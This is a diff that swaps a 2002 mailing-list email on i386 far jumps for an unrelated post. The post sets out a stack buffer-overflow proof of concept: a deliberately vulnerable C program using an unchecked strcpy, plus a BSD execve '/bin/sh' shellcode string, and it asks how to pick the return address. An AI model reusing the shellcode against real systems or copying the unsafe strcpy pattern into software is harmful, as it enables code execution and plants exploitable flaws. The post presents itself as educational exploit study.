@@ -1,56 +1,40 @@
-From: Emanuele Altieri <ealtieri@hampshire.edu>
-Subject: Re: i386: far jumps
-Date: 22 Jul 2002 16:16:42 -0400
+From: xlp <xlp@emtel.net.co>
+Subject: Proof of concept.
+Date: Fri, 26 Jul 2002 09:08:51 -0500
 Sender: linux-assembly-owner@vger.kernel.org
-Message-ID: <1027369002.1952.14.camel@italia>
-References: <1026786087.2055.99.camel@italia> 
-	<20020719174410.7c8f0d1f.lx@lxhp.in-berlin.de>
+Message-ID: <20020726090851.D365@nietzsche.metrotel.net.co>
 Mime-Version: 1.0
-Content-Transfer-Encoding: 7bit
+Content-Transfer-Encoding: 8bit
 Return-path: <linux-assembly-owner@vger.kernel.org>
-In-Reply-To: <20020719174410.7c8f0d1f.lx@lxhp.in-berlin.de>
+Content-Disposition: inline
 List-Id: <linux-assembly.vger.kernel.org>
 Content-Type: text/plain; charset="us-ascii"
-To: h-peter recktenwald <lx@lxhp.in-berlin.de>
-Cc: Linux Assembly List <linux-assembly@vger.kernel.org>
+To: linux-assembly@vger.kernel.org
 
-On Fri, 2002-07-19 at 13:44, h-peter recktenwald wrote:
-> On 15 Jul 2002 22:21:26 -0400
-> Emanuele Altieri <ealtieri@hampshire.edu> wrote:
-> 
-> > Greetings,
-> > 
-> > I'm doing some experiments with far jumps to different code segments.
-> > For example:
-> > 
-> >    ljmp *%fs:hello
-> > 
-> > I get a general protection error. I don't understand why. I believe it's
-> > a notation error. Can anybody see it?
-> > 
-> > I'm interested in this because I need the segment argument of ljmp to be
-> 
-> 	Linux?
+Hi, for educational purpose, I want to release a proof of concept for a 
+simple vulnerable program.
+%cat vuln.c
+main(int argc, char *argv[]){
+        int i;
+        char buf[200];
+        strcpy(buf,argv[1]);
+        for(i=0;i<=strlen(buf);i++)
+                printf("%c ",toupper(buf[i]));
+        printf("\n");
+exit(1);
+}
+Now, I have a buffer of 200 bytes, plus 4 of the sfp for the shellcode, so,
+I want to execute a simple execve to /bin/sh:
+char bsdshell[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+                  "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
+                  "\xb0\x3b\x50\xcd\x80";
+It's strlen(bsdshell)=25, so We have a shellcode that of 179 garbage, plus
+25 of execve opcode and finally 4 bytes of return addr.
+Now, I want to know, 
+Where should the 4 bytes of return addr should points to ?, to the execve code
+right, but what memory address?
+Who can I get that memory address ?
 
-No (/ not yet). I'm just experimenting on Intel's segmentation and task
-support with a small OS that I created for this purpose. I'm using GCC
-and GAS to implement it.
+bye.
 
-By the way, I found a workaround to the ljmp problem:
-
-    pushw <segment>
-    pushl <offset>
-    lret
-
-For example
-
-    pushw $16
-    pushl $hello
-    lret
-
-This is equivalent to "ljmp $16, $hello", but now the segment and offset
-arguments do not need to be constants.
-
-
-  -Emanuele
 
